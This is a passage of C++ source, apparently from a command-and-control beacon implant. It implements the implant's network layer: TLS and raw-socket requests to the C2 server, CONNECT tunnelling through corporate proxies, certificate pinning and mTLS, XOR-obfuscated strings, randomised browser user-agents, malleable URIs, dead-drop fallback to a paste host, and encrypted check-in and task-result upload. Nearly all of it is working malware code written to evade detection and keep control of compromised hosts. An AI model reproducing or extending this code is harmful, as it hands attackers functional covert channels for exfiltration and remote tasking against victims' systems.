            curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, "sha256//AAAA");
        } else {
            curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, spki.c_str());
        }
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#elif BEACON_MTLS_ENABLED
        // mTLS: verify the chain against the private CA (client cert already
        // proves identity); hostname check is skipped because the operator
        // connects via IP while the cert SAN may only carry localhost.
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#else
        // Self-signed C2 certificate: mirror the Windows/Linux behaviour
        // (the payload is additionally AES-GCM encrypted end-to-end).
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
#endif
    }

    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return response_body;
}
#else
// ── Linux + Android (raw sockets + OpenSSL) ────────────────────────────────
inline std::string get_random_ua() {
    int r = rand() % 3;
    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
}

inline bool connect_with_timeout(int sock, const sockaddr* address,
                                 socklen_t address_len, int timeout_seconds) {
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0 || fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) return false;
    int rc = connect(sock, address, address_len);
    if (rc < 0 && errno != EINPROGRESS) {
        fcntl(sock, F_SETFL, flags);
        return false;
    }
    if (rc < 0) {
        fd_set write_set;
        FD_ZERO(&write_set);
        FD_SET(sock, &write_set);
        timeval timeout{timeout_seconds, 0};
        rc = select(sock + 1, nullptr, &write_set, nullptr, &timeout);
        if (rc <= 0) {
            fcntl(sock, F_SETFL, flags);
            return false;
        }
        int socket_error = 0;
        socklen_t error_len = sizeof(socket_error);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &socket_error, &error_len) < 0 || socket_error != 0) {
            fcntl(sock, F_SETFL, flags);
            return false;
        }
    }
    fcntl(sock, F_SETFL, flags);
    return true;
}

// ── proxy + dialing (Linux/macOS/Android) ─────────────────────────────────
//
// A raw-socket beacon that ignores the proxy is unreachable in every
// corporate network: the proxy is the only egress. Same order as the Windows
// path — explicit config first, then the environment the operator's shell
// already uses — and the tunnel is a plain CONNECT, which is what a browser
// does for an https:// URL.

struct ProxyEndpoint {
    std::string host;
    int port = 0;
    bool valid = false;
};

inline std::string trim_spaces(const std::string& value) {
    size_t first = value.find_first_not_of(" \t\r\n");
    if (first == std::string::npos) return "";
    size_t last = value.find_last_not_of(" \t\r\n");
    return value.substr(first, last - first + 1);
}

inline ProxyEndpoint parse_proxy(const std::string& url) {
    ProxyEndpoint out;
    std::string s = trim_spaces(url);
    size_t scheme = s.find("://");
    if (scheme != std::string::npos) s = s.substr(scheme + 3);
    size_t at = s.find('@');            // drop user[:pass]@
    if (at != std::string::npos) s = s.substr(at + 1);
    size_t slash = s.find('/');
    if (slash != std::string::npos) s = s.substr(0, slash);
    if (s.empty()) return out;
    size_t colon = s.rfind(':');
    if (colon == std::string::npos || colon == 0) {
        out.host = s;
        out.port = 3128;                 // conventional HTTP-proxy port
    } else {
        out.host = s.substr(0, colon);
        try {
            out.port = std::stoi(s.substr(colon + 1));
        } catch (...) {
            out.port = 3128;
        }
    }
    out.valid = !out.host.empty() && out.port > 0 && out.port < 65536;
    return out;
}

inline std::string proxy_from_env() {
    const char* names[] = {"https_proxy", "HTTPS_PROXY", "all_proxy",
                           "ALL_PROXY", "http_proxy", "HTTP_PROXY"};
    for (const char* name : names) {
        const char* value = getenv(name);
        if (value && *value) return std::string(value);
    }
    return "";
}

inline bool proxy_bypassed(const std::string& host) {
    const char* raw = getenv("no_proxy");
    if (!raw || !*raw) raw = getenv("NO_PROXY");
    if (!raw || !*raw) return false;
    std::string list(raw);
    size_t start = 0;
    while (start <= list.size()) {
        size_t comma = list.find(',', start);
        std::string entry = trim_spaces(list.substr(
            start, comma == std::string::npos ? std::string::npos : comma - start));
        if (entry == "*") return true;
        if (!entry.empty() && entry.size() <= host.size() &&
            host.compare(host.size() - entry.size(), entry.size(), entry) == 0) {
            return true;
        }
        if (comma == std::string::npos) break;
        start = comma + 1;
    }
    return false;
}

// Resolve + connect, trying every address getaddrinfo returns (IPv6 first
// when the host has one): the old `gethostbyname` was IPv4-only, so an
// IPv6-only or dual-stack C2 was simply unreachable.
inline int dial_tcp(const std::string& host, int port) {
    struct addrinfo hints{};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* resolved = nullptr;
    std::string port_str = std::to_string(port);
    if (getaddrinfo(host.c_str(), port_str.c_str(), &hints, &resolved) != 0 ||
        resolved == nullptr) {
        return -1;
    }
    int sock = -1;
    for (struct addrinfo* ai = resolved; ai != nullptr; ai = ai->ai_next) {
        int candidate = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (candidate < 0) continue;
        timeval io_timeout{15, 0};
        setsockopt(candidate, SOL_SOCKET, SO_RCVTIMEO, &io_timeout, sizeof(io_timeout));
        setsockopt(candidate, SOL_SOCKET, SO_SNDTIMEO, &io_timeout, sizeof(io_timeout));
        if (connect_with_timeout(candidate, ai->ai_addr,
                                 (socklen_t)ai->ai_addrlen, 15)) {
            sock = candidate;
            break;
        }
        close(candidate);
    }
    freeaddrinfo(resolved);
    return sock;
}

// HTTP CONNECT tunnel: what a browser does for an https:// URL behind a
// proxy. "200" in the status line is the only acceptance.
inline bool proxy_tunnel(int sock, const std::string& host, int port) {
    std::string target = host + ":" + std::to_string(port);
    std::string request = "CONNECT " + target + " HTTP/1.1\r\n"
                          "Host: " + target + "\r\n"
                          "Proxy-Connection: keep-alive\r\n\r\n";
    size_t sent = 0;
    while (sent < request.size()) {
        int written = (int)send(sock, request.data() + sent,
                                request.size() - sent, 0);
        if (written <= 0) return false;
        sent += (size_t)written;
    }
    std::string response;
    char buffer[512];
    while (response.find("\r\n\r\n") == std::string::npos && response.size() < 4096) {
        int got = (int)recv(sock, buffer, sizeof(buffer), 0);
        if (got <= 0) break;
        response.append(buffer, (size_t)got);
    }
    return response.find(" 200") != std::string::npos;
}

#if BEACON_VERIFY_CALLBACK
// The pin the CURRENT handshake must see. The verifier is a C callback with
// no access to the config, and the beacon is single-threaded: the request
// path sets this immediately before connecting.
inline std::string& active_pin_slot() {
    static std::string pin;
    return pin;
}

// PIN-FIRST verification.
//
// The old callback rejected the connection whenever `preverify_ok` was false,
// which made it useless against the deployment it was written for: the C2
// presents a SELF-SIGNED certificate, so the chain check always failed and
// the pin could never be reached. Now the leaf fingerprint IS the decision:
// a mismatch is a hard failure no matter what the (absent) chain said, a
// match is accepted, and only the leaf (depth 0) is judged — intermediates
// are the C2's business.
inline int verify_server_pin(int preverify_ok, X509_STORE_CTX* store_ctx) {
    (void)preverify_ok;
    if (X509_STORE_CTX_get_error_depth(store_ctx) != 0) return 1;
    X509* certificate = X509_STORE_CTX_get_current_cert(store_ctx);
    if (!certificate) return 0;
    unsigned char digest[EVP_MAX_MD_SIZE] = {0};
    unsigned int digest_len = 0;
    if (X509_digest(certificate, EVP_sha256(), digest, &digest_len) != 1) return 0;
    const std::string& want = active_pin_slot();
    if (want.empty()) {
#if BEACON_MTLS_ENABLED
        // No pin for this rung, but mTLS authenticated the peer the other
        // way round (the private CA + our client cert); accept the chain.
        return 1;
#else
        // Enforcement is on and no pin is known for this rung: refuse rather
        // than trust an unauthenticated peer (fail closed).
        return 0;
#endif
    }
    return crypto::hex_encode(digest, digest_len) == want;
}
#endif

#if BEACON_MTLS_ENABLED
inline bool configure_mtls(SSL_CTX* ssl_ctx) {
    BIO* ca_bio = BIO_new_mem_buf(BEACON_CLIENT_CA_PEM, -1);
    X509* ca_cert = ca_bio ? PEM_read_bio_X509(ca_bio, nullptr, nullptr, nullptr) : nullptr;
    if (ca_bio) BIO_free(ca_bio);
    if (!ca_cert || X509_STORE_add_cert(SSL_CTX_get_cert_store(ssl_ctx), ca_cert) != 1) {
        if (ca_cert) X509_free(ca_cert);
        return false;
    }
    X509_free(ca_cert);
    BIO* cert_bio = BIO_new_mem_buf(BEACON_CLIENT_CERT_PEM, -1);
    X509* client_cert = cert_bio ? PEM_read_bio_X509(cert_bio, nullptr, nullptr, nullptr) : nullptr;
    if (cert_bio) BIO_free(cert_bio);
    BIO* key_bio = BIO_new_mem_buf(BEACON_CLIENT_KEY_PEM, -1);
    EVP_PKEY* client_key = key_bio ? PEM_read_bio_PrivateKey(key_bio, nullptr, nullptr, nullptr) : nullptr;
    if (key_bio) BIO_free(key_bio);
    if (!client_cert || !client_key || SSL_CTX_use_certificate(ssl_ctx, client_cert) != 1 ||
        SSL_CTX_use_PrivateKey(ssl_ctx, client_key) != 1 ||
        SSL_CTX_check_private_key(ssl_ctx) != 1) {
        if (client_cert) X509_free(client_cert);
        if (client_key) EVP_PKEY_free(client_key);
        return false;
    }
    X509_free(client_cert);
    EVP_PKEY_free(client_key);
    SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_PEER, verify_server_pin);
    return true;
}
#endif

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    std::string host_narrow(cfg.host.begin(), cfg.host.end());
    std::string path_narrow(path.begin(), path.end());
    std::string method_narrow(method.begin(), method.end());

    // The peer we DIAL may be a proxy while the peer we SPEAK TO is the C2:
    // resolve the egress first (config, then the environment), tunnel to the
    // target, then run TLS end-to-end over the tunnel.
    std::string proxy_url = cfg.proxy.empty() ? proxy_from_env() : cfg.proxy;
    ProxyEndpoint proxy;
    if (!proxy_url.empty() && !proxy_bypassed(host_narrow)) {
        proxy = parse_proxy(proxy_url);
    }
    std::string dial_host = proxy.valid ? proxy.host : host_narrow;
    int dial_port = proxy.valid ? proxy.port : cfg.port;

    int sock = dial_tcp(dial_host, dial_port);
    if (sock < 0) return "";
    if (proxy.valid && !proxy_tunnel(sock, host_narrow, cfg.port)) {
        close(sock);
        return "";
    }

    SSL_CTX *ssl_ctx = nullptr;
    SSL *ssl = nullptr;
    if (cfg.use_https) {
        SSL_load_error_strings();
        OpenSSL_add_all_algorithms();
        ssl_ctx = SSL_CTX_new(TLS_client_method());
        if (ssl_ctx) {
#if BEACON_MTLS_ENABLED
            if (!configure_mtls(ssl_ctx)) {
                SSL_CTX_free(ssl_ctx);
                close(sock);
                return "";
            }
#endif
#if BEACON_PIN_ENFORCED
            // Without mTLS nothing verified the peer at all: a default build
            // would complete a TLS handshake with ANY server. Pin-first
            // verification makes the leaf fingerprint the decision, which is
            // the only check that works against a self-signed C2. The pin is
            // the CURRENT rung's (per-endpoint pins).
            active_pin_slot() = cfg.active_pin();
            SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_PEER, verify_server_pin);
#endif
            ssl = SSL_new(ssl_ctx);
            if (!ssl) {
                SSL_CTX_free(ssl_ctx);
                close(sock);
                return "";
            }
            SSL_set_tlsext_host_name(ssl, host_narrow.c_str());
            SSL_set_fd(ssl, sock);
        }
    }

    if (ssl && SSL_connect(ssl) <= 0) {
        SSL_free(ssl); SSL_CTX_free(ssl_ctx); close(sock);
        return "";
    }

#if BEACON_AUTH_ENABLED
    auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
#endif
    std::string req = method_narrow + " " + path_narrow + " HTTP/1.1\r\n"
        + "Host: " + host_narrow + ":" + std::to_string(cfg.port) + "\r\n"
        + "User-Agent: " + get_random_ua() + "\r\n"
        + "Content-Type: text/plain\r\n";
    if (!beacon_id.empty())
        req += "X-Beacon-Id: " + beacon_id + "\r\n";
    bool tok = path_narrow.rfind("/x", 0) == 0 &&
               (path_narrow.size() == 2 || path_narrow[2] == '?' || path_narrow[2] == '/');
    const std::string& raw_payload_tok = crypto::payload_token();
    if (!raw_payload_tok.empty() &&
        (path_narrow.find("/api/v1/payload") != std::string::npos || tok))
        req += "X-Auth-Token: " + raw_payload_tok + "\r\n";
#if BEACON_AUTH_ENABLED
    req += "X-Beacon-Timestamp: " + auth.timestamp + "\r\n";
    req += "X-Beacon-Counter: " + auth.counter + "\r\n";
    req += "X-Beacon-Nonce: " + auth.nonce + "\r\n";
    req += "X-Beacon-Auth: " + auth.signature + "\r\n";
#endif
    if (!body.empty())
        req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    req += "Connection: close\r\n\r\n";
    if (!body.empty())
        req += body;

    // Partial writes are legal for both SSL_write and send(): loop until the
    // whole request (headers + body) has been handed to the kernel, otherwise
    // the body may be silently dropped while the server still counts the
    // request — breaking the HMAC (signed body vs received empty body).
    if (ssl) {
        size_t total_sent = 0;
        while (total_sent < req.size()) {
            int written = SSL_write(ssl, req.data() + total_sent,
                                    static_cast<int>(req.size() - total_sent));
            if (written <= 0) break;
            total_sent += static_cast<size_t>(written);
        }
    } else {
        size_t total_sent = 0;
        while (total_sent < req.size()) {
            int written = static_cast<int>(send(sock, req.data() + total_sent,
                                                req.size() - total_sent, 0));
            if (written <= 0) break;
            total_sent += static_cast<size_t>(written);
        }
    }

    char buf[4096];
    int n;
    while ((n = ssl ? SSL_read(ssl, buf, sizeof(buf)) : static_cast<int>(recv(sock, buf, sizeof(buf), 0))) > 0) {
        if (response_body.size() + static_cast<size_t>(n) > 10 * 1024 * 1024) {
            if (ssl) { SSL_free(ssl); SSL_CTX_free(ssl_ctx); }
            close(sock);
            return "";
        }
        response_body.append(buf, static_cast<size_t>(n));
    }

    size_t hdr_end = response_body.find("\r\n\r\n");
    if (hdr_end != std::string::npos)
        response_body = response_body.substr(hdr_end + 4);

    if (ssl) { SSL_free(ssl); SSL_CTX_free(ssl_ctx); }
    close(sock);
    return response_body;
}
#endif

// ── High-Level C2 Functions ────────────────────────────────────────────────

// ── Malleable URIs (profile-driven) ────────────────────────────────────────

inline std::wstring get_malleable_path(const std::wstring& /*original*/) {
    std::string path = malleable::next_get_path();
    return std::wstring(path.begin(), path.end());
}

inline std::wstring get_malleable_result_path() {
    std::string path = malleable::next_post_path();
    return std::wstring(path.begin(), path.end());
}

// ── Check-in & Result ──────────────────────────────────────────────────────

// Check in with the C2 server and retrieve pending tasks.
// Returns the decrypted JSON string with tasks, or "" on failure.
// ── last ring: refresh the ladder from the dead drop ─────────────────────
// Returns true when the dead drop yielded a NEW endpoint that became the
// first rung. Bounded to a single request; a failure is a plain `false`, so
// the caller keeps its normal backoff. The probe runs through a COPY of the
// config so the live one is only mutated on success.
inline bool refresh_from_dead_drop(C2Config& cfg) {
    if (cfg.dead_drop.empty()) return false;
    bool https = true;
    std::string rest = cfg.dead_drop;
    if (rest.rfind("https://", 0) == 0) { https = true; rest = rest.substr(8); }
    else if (rest.rfind("http://", 0) == 0) { https = false; rest = rest.substr(7); }
    std::string hostport = rest, path = "/";
    size_t slash = rest.find('/');
    if (slash != std::string::npos) {
        hostport = rest.substr(0, slash);
        path = rest.substr(slash);
    }
    std::string dd_host = hostport;
    int dd_port = https ? 443 : 80;
    size_t colon = hostport.rfind(':');
    if (colon != std::string::npos) {
        dd_host = hostport.substr(0, colon);
        int parsed = std::atoi(hostport.substr(colon + 1).c_str());
        if (parsed > 0 && parsed < 65536) dd_port = parsed;
    }
    if (dd_host.empty() || dd_host == "") return false;

    C2Config probe = cfg;
    probe.use_https = https;
#ifdef _WIN32
    probe.host = std::wstring(dd_host.begin(), dd_host.end());
#else
    probe.host = dd_host;
#endif
    probe.port = dd_port;
#ifdef _WIN32
    // the cached connection belongs to the CURRENT endpoint: drop it so the
    // probe dials the dead drop, then drop the probe's so the next check-in
    // reopens against the live config
    g_ctx.cleanup();
#endif
    std::string body = http_request(
        probe, XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
        std::wstring(path.begin(), path.end()), "", "");
#ifdef _WIN32
    g_ctx.cleanup();
#endif
    if (body.empty()) return false;

    // the record is base64(XOR("phx1|host|port|ssl")): base64_decode skips
    // the whitespace/markup a paste host may pad the page with, and a page
    // that is not a record fails the prefix check (never half-applied)
    std::vector<BYTE> raw = crypto::base64_decode(body);
    if (raw.empty()) return false;
    for (auto& b : raw) b = static_cast<BYTE>(b ^ C2_DEADDROP_KEY);
    std::string rec(raw.begin(), raw.end());
    if (rec.rfind("phx1|", 0) != 0) return false;
    size_t p1 = rec.find('|', 5);
    if (p1 == std::string::npos) return false;
    size_t p2 = rec.find('|', p1 + 1);
    if (p2 == std::string::npos) return false;
    std::string new_host = rec.substr(5, p1 - 5);
    int new_port = std::atoi(rec.substr(p1 + 1, p2 - p1 - 1).c_str());
    bool new_https = (rec.substr(p2 + 1, 1) == "1");
    if (new_host.empty() || new_port <= 0 || new_port > 65535) return false;

    cfg.port = new_port;
    cfg.use_https = new_https;
    cfg.ladder.erase(std::remove(cfg.ladder.begin(), cfg.ladder.end(), new_host),
                     cfg.ladder.end());
    cfg.ladder.insert(cfg.ladder.begin(), new_host);
    cfg.ladder_index = 0;
    cfg.failures_here = 0;
    cfg.apply_endpoint();
    return true;
}

inline std::string checkin(const C2Config& cfg, const std::string& payload = "") {
    std::wstring method = payload.empty() ? XOR_WDEC(XOR_WSTR(L"GET")).c_str() : XOR_WDEC(XOR_WSTR(L"POST")).c_str();
    
    std::string body = payload.empty() ? "" : crypto::encrypt(payload);
    
    std::wstring path = get_malleable_path(XOR_WDEC(XOR_WSTR(L"/api/v1/ping")).c_str());
    
    std::string encrypted_response = http_request(
        cfg, method, path, body, cfg.beacon_id);

    if (encrypted_response.empty()) return "";
    return crypto::decrypt(encrypted_response);
}

// Send an encrypted result back to the C2 server.
inline bool send_result(const C2Config& cfg, const std::string& task_id, const std::string& output) {
    // Escape the output for JSON
    std::string escaped_output;
    for (char c : output) {
        if (c == '"') escaped_output += "\\\"";
        else if (c == '\\') escaped_output += "\\\\";
        else if (c == '\n') escaped_output += "\\n";
        else if (c == '\r') escaped_output += "\\r";
        else if (c == '\t') escaped_output += "\\t";
        else escaped_output += c;
    }

    // Build JSON payload
    std::string json = std::string(XOR_DEC(XOR_STR("{\"task_id\":\"")).c_str()) + task_id + XOR_DEC(XOR_STR("\",\"output\":\"")).c_str() + escaped_output + XOR_DEC(XOR_STR("\"}")).c_str();

    std::string encrypted = crypto::encrypt(json);
    if (encrypted.empty()) return false;
    
    std::wstring path = get_malleable_result_path();
    std::string resp = http_request(cfg, XOR_WDEC(XOR_WSTR(L"POST")).c_str(), path, encrypted, cfg.beacon_id);
    return !resp.empty();
}

#ifdef _WIN32
inline void cleanup() {
    g_ctx.cleanup();
}

inline void WinHttpContext::cleanup() {
    if (hConnect) { winhttp_dyn::WinHttpCloseHandleDynamic(hConnect); hConnect = nullptr; }
    if (hSession) { winhttp_dyn::WinHttpCloseHandleDynamic(hSession); hSession = nullptr; }
}
#endif

}  // namespace net
